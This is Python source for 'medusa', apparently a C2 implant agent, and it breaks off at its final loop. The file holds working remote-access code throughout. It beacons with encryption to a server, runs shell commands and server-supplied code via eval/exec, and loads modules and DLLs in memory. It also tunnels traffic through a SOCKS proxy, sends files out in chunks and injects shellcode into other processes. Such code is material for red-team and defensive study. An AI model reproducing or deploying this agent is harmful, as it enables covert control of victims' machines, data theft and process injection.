import os, random, sys, json, socket, base64, time, platform, ssl
import threading, urllib2
from datetime import datetime
from Queue import Queue

CHUNK_SIZE = 51200

class medusa:
    def encrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding
        from cryptography.hazmat.backends import default_backend

        if not self.agent_config["enc_key"]["value"] == "none" and len(data)>0:
            key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
            iv = os.urandom(16)

            backend = default_backend()
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
            encryptor = cipher.encryptor()

            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data)
            padded_data += padder.finalize()

            ct = encryptor.update(padded_data) + encryptor.finalize()

            h = hmac.HMAC(key, hashes.SHA256(), backend)
            h.update(iv + ct)
            hmac = h.finalize()

            output = iv + ct + hmac
            return output
        else:
            return data

    def decrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding
        from cryptography.hazmat.backends import default_backend

        if not self.agent_config["enc_key"]["value"] == "none":
            if len(data)>0:
                backend = default_backend()

                key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
                uuid = data[:36]
                iv = data[36:52]
                ct = data[52:-32]
                received_hmac = data[-32:]

                h = hmac.HMAC(key, hashes.SHA256(), backend)
                h.update(iv + ct)
                hmac = h.finalize()

                if base64.b64encode(hmac) == base64.b64encode(received_hmac):
                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
                    decryptor = cipher.decryptor()
                    pt = decryptor.update(ct) + decryptor.finalize()
                    unpadder = padding.PKCS7(128).unpadder()
                    decrypted_data = unpadder.update(pt)
                    decrypted_data += unpadder.finalize()
                    return (uuid+decrypted_data).decode()
                else: return ""
            else: return ""
        else:
            return data.decode()


    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return os.getlogin() 
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
    
    def formatMessage(self, data):
        return base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass
        
    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.postMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        data = {
            "action": "checkin",
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": socket.gethostname(),
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header["name"]] = header["value"]
  
        if method == 'GET':
            req = urllib2.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib2.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
        
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib2.HTTPSHandler if tls else urllib2.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib2.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib2.HTTPBasicAuthHandler()
                opener = urllib2.build_opener(proxy, auth, handler)
            else:
                proxy = urllib2.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib2.build_opener(proxy, handler)
            urllib2.install_opener(opener)
        try:
            out = base64.b64decode(urllib2.urlopen(req).read())
            return out.decode() if method == 'GET' else out
        except: return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        now = datetime.now()
        if now >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

    def rm(self, task_id, path):
        import shutil
        file_path = path if path[0] == os.sep \
                else os.path.join(self.current_directory,path)
        if os.path.isdir(file_path):
            shutil.rmtree(file_path)
        else:
            os.remove(file_path)

    def eval_code(self, task_id, command):
        return eval(command)
        
    def socks(self, task_id, action, port):
        import socket, select
        from threading import Thread, active_count
        from struct import pack, unpack
        from Queue import Queue 
        
        MAX_THREADS = 200
        BUFSIZE = 2048
        TIMEOUT_SOCKET = 5
        OUTGOING_INTERFACE = ""

        VER = b'\x05'
        M_NOAUTH = b'\x00'
        M_NOTAVAILABLE = b'\xff'
        CMD_CONNECT = b'\x01'
        ATYP_IPV4 = b'\x01'
        ATYP_DOMAINNAME = b'\x03'

        SOCKS_SLEEP_INTERVAL = 0.1
        QUEUE_TIMOUT = 1

        def sendSocksPacket(server_id, data, exit_value):
            self.socks_out.put({ "server_id": server_id, 
                "data": base64.b64encode(data), "exit": exit_value })
            
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT_SOCKET)
            except: return "Failed to create socket: {}".format(str(err))
            return sock

        def connect_to_dst(dst_addr, dst_port):
            sock = create_socket()
            if OUTGOING_INTERFACE:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, OUTGOING_INTERFACE)
                except PermissionError as err: return 0
            try:
                sock.connect((str(dst_addr), int(dst_port)))
                return sock
            except socket.error as err: return 0

        def request_client(msg):
            try:
                message = base64.b64decode(msg["data"])
                s5_request = bytearray(message[:BUFSIZE])
            except:
                return False
            if (s5_request[0:1] != VER or s5_request[1:2] != CMD_CONNECT or s5_request[2:3] != b'\x00'):
                return False
            if s5_request[3:4] == ATYP_IPV4:
                dst_addr = socket.inet_ntoa(s5_request[4:-2])
                dst_port = unpack('>H', s5_request[8:len(s5_request)])[0]
            elif s5_request[3:4] == ATYP_DOMAINNAME:
                sz_domain_name = s5_request[4]
                dst_addr = s5_request[5: 5 + sz_domain_name - len(s5_request)]
                port_to_unpack = s5_request[5 + sz_domain_name:len(s5_request)]
                dst_port = unpack('>H', port_to_unpack)[0]
            else: return False
            return (dst_addr, dst_port)

        def create_connection(msg):
            dst = request_client(msg)
            rep = b'\x07'
            bnd = b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00'
            if dst: 
                socket_dst = connect_to_dst(dst[0], dst[1])
            if not dst or socket_dst == 0: rep = b'\x01'
            else:
                rep = b'\x00'
                bnd = socket.inet_aton(socket_dst.getsockname()[0])
                bnd += pack(">H", socket_dst.getsockname()[1])
            reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
            try: sendSocksPacket(msg["server_id"], reply, msg["exit"])                
            except: return
            if rep == b'\x00': return socket_dst

        def get_running_socks_thread():
            return [ t for t in threading.enumerate() if "socks:" in t.name and not task_id in t.name ]

        def a2m(server_id, socket_dst):
            while True:
                if task_id not in [task["task_id"] for task in self.taskings]: return
                elif [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return
                if server_id not in self.socks_open.keys(): return
                try: reader, _, _ = select.select([socket_dst], [], [], 1)
                except select.error as err: return

                if not reader: continue
                try:
                    for sock in reader:
                        data = sock.recv(BUFSIZE)
                        if not data:
                            sendSocksPacket(server_id, b"", True)
                            socket_dst.close()
                            return
                        sendSocksPacket(server_id, data, False)
                except Exception as e: pass
                time.sleep(SOCKS_SLEEP_INTERVAL)

        def m2a(server_id, socket_dst):
            while True:
                if task_id not in [task["task_id"] for task in self.taskings]: return
                elif [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return
                if server_id not in self.socks_open.keys():
                    socket_dst.close()
                    return
                try:
                    if not self.socks_open[server_id].empty():
                        socket_dst.send(base64.b64decode(self.socks_open[server_id].get(timeout=QUEUE_TIMOUT)))
                except: pass
                time.sleep(SOCKS_SLEEP_INTERVAL)

        t_socks = get_running_socks_thread()

        if action == "start":
            if len(t_socks) > 0: return "[!] SOCKS Proxy already running."
            self.sendTaskOutputUpdate(task_id, "[*] SOCKS Proxy started.\n")
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "[*] SOCKS Proxy stopped."
                if not self.socks_in.empty():
                    packet_json = self.socks_in.get(timeout=QUEUE_TIMOUT)
                    if packet_json:
                        server_id = packet_json["server_id"]
                        if server_id in self.socks_open.keys():
                            if packet_json["data"]: 
                                self.socks_open[server_id].put(packet_json["data"])
                            elif packet_json["exit"]:
                                self.socks_open.pop(server_id)
                        else:
                            if not packet_json["exit"]:    
                                if active_count() > MAX_THREADS:
                                    sleep(3)
                                    continue
                                self.socks_open[server_id] = Queue()
                                sock = create_connection(packet_json)
                                if sock:
                                    send_thread = Thread(target=a2m, args=(server_id, sock, ), name="A2M:{}".format(server_id))
                                    recv_thread = Thread(target=m2a, args=(server_id, sock, ), name="M2A:{}".format(server_id))
                                    send_thread.start()
                                    recv_thread.start()
                time.sleep(SOCKS_SLEEP_INTERVAL)
        else:
            if len(t_socks) > 0:
                for t_sock in t_socks:
                    task = [task for task in self.taskings if task["task_id"] == t_sock.name.split(":")[1]][0]
                    task["stopped"] = task["completed"] = True
                self.socks_open = {}

    def load_script(self, task_id, file):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()
            
        if cmd_code: exec(cmd_code)
        else: return "Failed to load script"

    def watch_dir(self, task_id, path, seconds):
        import hashlib
        known_files = {}
        def diffFolder(file_path, print_out=True):
            for root, dirs, files in os.walk(file_path):
                for dir in dirs:
                    full_dir_path = os.path.join(root, dir)
                    if full_dir_path not in known_files.keys():
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] New Directory: {}".format(full_dir_path)	)
                        known_files[full_dir_path] = ""

                for file in files:
                    full_file_path = os.path.join(root, file)
                    file_size = 0  
                    try: 
                        with open(full_file_path, "rb") as in_f:
                            file_data = in_f.read()
                            file_size = len(file_data)
                    except: continue

                    hash = hashlib.md5(file_data).hexdigest()

                    if full_file_path not in known_files.keys() and hash not in known_files.values():
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] New File: {} - {} bytes ({})".format(full_file_path, file_size, hash))
                        known_files[full_file_path] = hash
                    elif full_file_path in known_files.keys() and hash not in known_files.values():
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] File Updated: {} - {} bytes ({})".format(full_file_path, file_size, hash))
                        known_files[full_file_path] = hash
                    elif full_file_path not in known_files.keys() and hash in known_files.values():
                        orig_file = [f for f,h in known_files.items() if h == hash][0]
                        if os.path.exists(os.path.join(file_path, orig_file)):
                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] Copied File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
                        else:
                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] Moved File: {}->{} - {} bytes ({})".format(orig_file, full_file_path, file_size, hash))
                            known_files.pop(orig_file)
                    known_files[full_file_path] = hash
            for file in list(known_files):
                if not os.path.isdir(os.path.dirname(file)):
                    for del_file in [f for f in list(known_files) if f.startswith(os.path.dirname(file))]:
                        obj_type = "Directory" if not known_files[del_file] else "File"
                        if file in list(known_files):
                            if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] {} deleted: {} {}".format(obj_type, \
                                del_file, "({})".format(known_files[del_file]) if known_files[del_file] else ""))
                            known_files.pop(file)
                else:
                    if os.path.basename(file) not in os.listdir(os.path.dirname(file)):
                        obj_type = "Directory" if not known_files[file] else "File"
                        if print_out: self.sendTaskOutputUpdate(task_id, "\n[*] {} deleted: {} {}".format(obj_type, file, \
                            "({})".format(known_files[file]) if known_files[file] else ""))
                        known_files.pop(file)
    
        if path == ".": file_path = self.current_directory
        else: file_path = path if path[0] == os.sep \
                else os.path.join(self.current_directory,path)

        if not os.path.isdir(file_path):
            return "[!] Path must be a valid directory"
        elif not os.access(file_path, os.R_OK):
            return "[!] Path not accessible"
        else:
            self.sendTaskOutputUpdate(task_id, "[*] Starting directory watch for {}".format(path))
            diffFolder(file_path, False) 
            while(True):
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return "Job stopped."
                if not os.path.exists(file_path):
                    return "[!] Root directory has been deleted."
                diffFolder(file_path)
                time.sleep(seconds)

    def list_modules(self, task_id, module_name=""):
        if module_name:
            if module_name in self.moduleRepo.keys():
                return "\n".join(self.moduleRepo[module_name].namelist())
            else: return "{} not found in loaded modules".format(module_name)
        else:
            return "\n".join(self.moduleRepo.keys())

    def unload_module(self, task_id, module_name):
        if module_name in self._meta_cache:
            finder = self._meta_cache.pop(module_name)
            sys.meta_path.remove(finder)
            self.moduleRepo.pop(module_name)
            return "{} module unloaded".format(module_name)
        else: return "{} not found in loaded modules".format(module_name)

    def shell(self, task_id, command):
        import subprocess
        process = subprocess.Popen(command, stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, cwd=self.current_directory, shell=True)
        stdout, stderr = process.communicate()
        out = stderr if stderr else stdout
        return out.decode()

    def exit(self, task_id):
        os._exit(0)

    def upload(self, task_id, file, remote_path):
        total_chunks = 1
        chunk_num = 0
        with open(remote_path, "wb") as f:
            while (chunk_num < total_chunks):
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                data = { 
                    "action": "post_response",
                    "responses": [
                        {
                            "upload": {
                                "chunk_size": CHUNK_SIZE,
                                "file_id": file, 
                                "chunk_num": chunk_num,
                                "full_path": remote_path
                            },
                            "task_id": task_id
                        }
                    ] 
                }
                response = self.postMessageAndRetrieveResponse(data)
                chunk = response["responses"][0]
                chunk_num+=1
                total_chunks = chunk["total_chunks"]
                f.write(base64.b64decode(chunk["chunk_data"]))

    def cwd(self, task_id):
        return self.current_directory
        
    def load(self, task_id, file_id, command):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()

        if cmd_code:
            exec(cmd_code.replace("\n    ","\n")[4:])
            setattr(medusa, command, eval(command))
            cmd_list = [{"action": "add", "cmd": command}]
            responses = [{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }]
            message = { "action": "post_response", "responses": responses }
            response_data = self.postMessageAndRetrieveResponse(message)
        else: return "Failed to upload '{}' command".format(command)

    def ls(self, task_id, path, file_browser=False):
        if path == ".": file_path = self.current_directory
        else: file_path = path if path[0] == os.sep \
                else os.path.join(self.current_directory,path)
        file_details = os.stat(file_path)
        target_is_file = os.path.isfile(file_path)
        target_name = os.path.basename(file_path.rstrip(os.sep))
        file_browser = {
            "host": socket.gethostname(),
            "is_file": target_is_file,
            "permissions": {"octal": oct(file_details.st_mode)[-3:]},
            "name": target_name if target_name not in [".", "" ] \
                    else os.path.basename(self.current_directory.rstrip(os.sep)),
            "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)),
            "success": True,
            "access_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_atime)),
            "modify_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_mtime)),
            "size": file_details.st_size,
            "update_deleted": True,
        }
        files = []
        if not target_is_file:
            for entry in os.listdir(file_path):
                full_path = os.path.join(file_path, entry)
                file = {}
                file['name'] = entry 
                file['is_file'] = True if os.path.isfile(full_path) else False
                try:
                    file_details = os.stat(full_path)
                    file["permissions"] = { "octal": oct(file_details.st_mode)[-3:]}
                    file["access_time"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_atime))
                    file["modify_time"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_mtime))
                    file["size"] = file_details.st_size
                except OSError as e:
                    pass
                files.append(file)
        file_browser["files"] = files
        task = [task for task in self.taskings if task["task_id"] == task_id]
        task[0]["file_browser"] = file_browser
        return { "files": files, "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)), "name":  target_name if target_name not in  [".", ""] \
                    else os.path.basename(self.current_directory.rstrip(os.sep))  }

    def mv(self, task_id, source, destination):
        import shutil
        source_path = source if source[0] == os.sep \
                else os.path.join(self.current_directory,source)
        dest_path = destination if destination[0] == os.sep \
                else os.path.join(self.current_directory,destination)
        shutil.move(source_path, dest_path)

    def download(self, task_id, file):
        file_path = file if file[0] == os.sep \
                else os.path.join(self.current_directory,file)

        file_size = os.stat(file_path).st_size 
        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

        data = {
            "action": "post_response", 
            "responses": [
            {
                "task_id": task_id,
                "total_chunks": total_chunks,
                "full_path": file_path,
                "chunk_size": CHUNK_SIZE
            }]
        }
        initial_response = self.postMessageAndRetrieveResponse(data)
        chunk_num = 1
        with open(file_path, 'rb') as f:
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                content = f.read(CHUNK_SIZE)
                if not content:
                    break # done

                data = {
                    "action": "post_response", 
                    "responses": [
                        {
                            "chunk_num": chunk_num,
                            "chunk_data": base64.b64encode(content).decode(),
                            "task_id": task_id,
                            "file_id": initial_response["responses"][0]["file_id"],
                            "user_output": { 
                                "agent_file_id": initial_response["responses"][0]["file_id"], 
                                "filename": file,
                                "total_chunks": total_chunks
                            }
                        }
                    ]
                }
                chunk_num+=1
                response = self.postMessageAndRetrieveResponse(data)

    def jobkill(self, task_id, target_task_id):
        task = [task for task in self.taskings if task["task_id"] == target_task_id]
        task[0]["stopped"] = True

    def sleep(self, task_id, seconds, jitter=-1):
        self.agent_config["Sleep"] = int(seconds)
        if jitter != -1:
            self.agent_config["Jitter"] = int(jitter)

    def cd(self, task_id, path):
        if path == "..":
            self.current_directory = os.path.dirname(os.path.dirname(self.current_directory + os.sep))
        else:
            self.current_directory = path if path[0] == os.sep \
                else os.path.abspath(os.path.join(self.current_directory,path))

    def cat(self, task_id, path):
        file_path = path if path[0] == os.sep \
                else os.path.join(self.current_directory,path)
        
        with open(file_path, 'r') as f:
            content = f.readlines()
            return ''.join(content)

    def jobs(self, task_id):
        out = [t.name.split(":") for t in threading.enumerate() \
            if t.name != "MainThread" and "a2m" not in t.name \
            and "m2a" not in t.name and t.name != "jobs:{}".format(task_id) ]
        if len(out) > 0: return { "jobs": out }
        else: return "No long running jobs!"

    def load_dll(self, task_id, dllpath, dllexport):
        from ctypes import WinDLL
        dll_file_path = dllpath if dllpath[0] == os.sep \
                else os.path.join(self.current_directory,dllpath)
        loaded_dll = WinDLL(dll_file_path)
        eval("{}.{}()".format("loaded_dll",dllexport))
        return "[*] {} Loaded.".format(dllpath)

    def unload(self, task_id, command):
        try: getattr(medusa, command)
        except: return "{} not currently loaded.".format(command)
        delattr(medusa, command)
        cmd_list = [{"action": "remove", "cmd": command}]
        responses = [{ "task_id": task_id, "user_output": "Unloaded command: {}".format(command), "commands": cmd_list, "completed": True }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def load_module(self, task_id, file, module_name):
        import zipfile, io
        class CFinder(object):
            def __init__(self, repoName, instance):
                self.moduleRepo = instance.moduleRepo
                self.repoName = repoName
                self._source_cache = {}

            def _get_info(self, repoName, fullname):
                parts = fullname.split('.')
                submodule = parts[-1]
                modulepath = '/'.join(parts)
                _search_order = [('.py', False), ('/__init__.py', True)]
                for suffix, is_package in _search_order:
                    relpath = modulepath + suffix
                    try: self.moduleRepo[repoName].getinfo(relpath)
                    except KeyError: pass
                    else: return submodule, is_package, relpath
                msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
                raise ImportError(msg)

            def _get_source(self, repoName, fullname):
                submodule, is_package, relpath = self._get_info(repoName, fullname)
                fullpath = '%s/%s' % (repoName, relpath)
                if relpath in self._source_cache:
                    source = self._source_cache[relpath]
                    return submodule, is_package, fullpath, source
                try:
                    source =  self.moduleRepo[repoName].read(relpath)
                    source = source.replace(b'\r\n', b'\n')
                    source = source.replace(b'\r', b'\n')
                    self._source_cache[relpath] = source
                    return submodule, is_package, fullpath, source
                except: raise ImportError("Unable to obtain source for module %s" % (fullpath))

            def find_module(self, fullname, path=None):
                try: submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                except ImportError: return None
                else: return self

            def load_module(self, fullname):
                import imp
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                code = compile(source, fullpath, 'exec')
                mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
                mod.__loader__ = self
                mod.__file__ = fullpath
                mod.__name__ = fullname
                if is_package: mod.__path__ = [os.path.dirname(mod.__file__)]
                exec code in mod.__dict__
                return mod

            def get_data(self, fullpath):
                prefix = os.path.join(self.repoName, '')
                if not fullpath.startswith(prefix):
                    raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
                relpath = fullpath[len(prefix):]
                try: return self.moduleRepo[self.repoName].read(relpath)
                except KeyError: raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

            def is_package(self, fullname):
                """Return if the module is a package"""
                submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                return is_package

            def get_code(self, fullname):
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                return compile(source, fullpath, 'exec')

        if module_name in self.moduleRepo.keys(): return "{} module already loaded.".format(module_name)
        total_chunks = 1
        chunk_num = 0
        module_zip = bytearray()
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            total_chunks = chunk["total_chunks"]
            chunk_num+=1
            module_zip.extend(base64.b64decode(chunk["chunk_data"]))

        if module_zip:
            self.moduleRepo[module_name] = zipfile.ZipFile(io.BytesIO(module_zip))
            if module_name not in self._meta_cache:
                finder = CFinder(module_name, self)
                self._meta_cache[module_name] = finder
                sys.meta_path.append(finder)        
        else: return "Failed to download in-memory module"

    def env(self, task_id):
        return "\n".join(["{}: {}".format(x, os.environ[x]) for x in os.environ])
 
    def pip_freeze(self, task_id):
        out=""
        try:
            import pkg_resources
            installed_packages = pkg_resources.working_set
            installed_packages_list = sorted(["%s==%s" % (i.key, i.version) for i in installed_packages])
            return "\n".join(installed_packages_list)
        except:
            out+="[*] pkg_resources module not installed.\n"

        try:
            from pip._internal.operations.freeze import freeze
            installed_packages_list = freeze(local_only=True)
            return "\n".join(installed_packages_list)
        except:
            out+="[*] pip module not installed.\n"

        try:
            import pkgutil
            installed_packages_list = [ a for _, a, _ in pkgutil.iter_modules()]
            return "\n".join(installed_packages_list)
        except:
            out+="[*] pkgutil module not installed.\n"

        return out+"[!] No modules available to list installed packages."

    def shinject(self, task_id, shellcode, process_id):
        from ctypes import windll,c_int,byref,c_ulong
        total_chunks = 1
        chunk_num = 0
        sc = b""
        while (chunk_num < total_chunks):
            data = { 
                "action": "post_response", "responses": [{
                    "upload": { "chunk_size": 51200, "file_id": shellcode, "chunk_num": chunk_num+1 },
                    "task_id": task_id
                }] 
            }
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            sc+=base64.b64decode(chunk["chunk_data"])

        PAGE_EXECUTE_READWRITE = 0x00000040
        PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
        VIRTUAL_MEM  = ( 0x1000 | 0x2000 )

        kernel32 = windll.kernel32
        code_size = len(sc)
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(process_id))

        if not h_process:
            return "[!] Error: Couldn't acquire a handle to PID {}".format(process_id)
        arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, arg_address, sc, code_size, 0)
        thread_id = c_ulong(0)
        if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
            return "[!] Failed to create thread."
        return "[*] Remote thread created."

    def cp(self, task_id, source, destination):
        import shutil

        source_path = source if source[0] == os.sep \
                else os.path.join(self.current_directory,source)

        dest_path = destination if destination[0] == os.sep \
                else os.path.join(self.current_directory,destination)

        if os.path.isdir(source_path):
            shutil.copytree(source_path, dest_path)
        else:
            shutil.copy(source_path, dest_path)



    def __init__(self):
        self.socks_open = {}
        self.socks_in = Queue()
        self.socks_out = Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "http://10.0.2.15",
            "Port": "80",
            "PostURI": "/data",
            "PayloadUUID": "0e01f531-0aaf-48e5-aa7a-8b4018f1f355",
            "UUID": "",
            "Headers": [{"name": "User-Agent", "key": "User-Agent", "value": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"}],
            "Sleep": 10,
            "Jitter": 23,
            "KillDate": "2023-03-22",
            "enc_key": {"value": "aes256_hmac", "enc_key": "wBknqOK4lKoL57AoXTN0Cjz5yVMHVOmBJ+RYvtA+2HY=", "dec_key": "wBknqOK4lKoL57AoXTN0Cjz5yVMHVOmBJ+RYvtA+2HY="},
            "ExchChk": "T",
            "GetURI": "/index",
            "GetParam": "q",
            "ProxyHost": "",
            "ProxyUser": "",
            "ProxyPass": "",
            "ProxyPort": "",
        }

        while(True):
